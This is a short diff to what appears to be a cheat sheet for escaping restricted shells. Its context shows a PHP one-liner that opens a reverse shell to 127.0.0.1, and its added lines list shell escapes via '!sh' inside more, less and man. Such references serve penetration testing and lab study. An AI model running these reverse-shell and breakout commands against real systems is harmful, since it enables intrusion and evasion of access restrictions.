@@ -66,3 +66,20 @@ restired bash
 #### php
 
     php -r '$sock=fsockopen("127.0.0.1", 13666);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+### system binaries
+
+#### more
+
+    more long-file.txt
+    !sh
+
+#### less
+
+    less file.txt
+    !sh
+
+#### man
+
+    man man
+    !sh
